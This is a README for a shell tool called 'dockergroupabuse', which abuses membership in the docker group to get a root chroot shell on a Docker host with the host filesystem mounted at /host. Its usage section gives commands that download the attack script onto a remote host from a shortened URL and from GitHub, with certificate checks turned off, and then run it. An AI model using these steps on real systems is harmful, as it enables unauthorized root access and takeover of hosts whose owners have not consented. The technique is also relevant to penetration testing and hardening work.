# dockergroupabuse

This interactive script allows you to abuse the `docker` group to get root shells from minimal images that are already stored locally on the Docker host system.

The script will allow you to choose from any local image currently installed.

If there are no images installed, and the host has Internet access to the DockerHub repository, it will pull [lphxl/kaliroot](https://hub.docker.com/r/lphxl/kaliroot),
which gives you a root level chroot shell on the system, and when exiting the chroot, you have access to all Kali Linux repos and tools, while the host is accessible at `/host`.

If it can't connect to DockerHub, it will try to pull a number of popular base images from the registry that the docker daemon is currently attached to, and will create
a rootshell image from that image.

The script cleans up after itself by deleting the `Dockerfile` that it creates on the fly, as well as removing the container and image as soon as it exits the shell.

If necessary, you can change this functionality by simply editing the [`rootshell.sh`](rootshell.sh) script itself.

## Usage

Copy the contents of [`rootshell.sh`](rootshell.sh) to the clipboard and paste into `rootshell.sh` on the remote Docker host system.

Or if you have Internet access on the remote host, run one of the following commands:

- `curl -skLO https://tinyurl.com/rootshell`
- `wget --no-check-certificate https://tinyurl.com/rootshell`
- `curl -skLO https://raw.githubusercontent.com/phx/dockergroupabuse/master/rootshell.sh`
- `wget --no-check-certificate https://raw.githubusercontent.com/phx/dockergroupabuse/master/rootshell.sh`

### Remote Docker Host:

```
chmod +x rootshell.sh
./rootshell.sh
```

Feel free to modify [`rootshell.sh`](rootshell.sh) as necessary, but this script has worked with all images and systems I have tested.

### About `sh` vs `bash`

I have defaulted to using `sh` instead of `bash` in the commands in order to be cross-compatible with Alpine-based minimal images and such.  Feel free to call `bash` from `sh` after getting the shell.
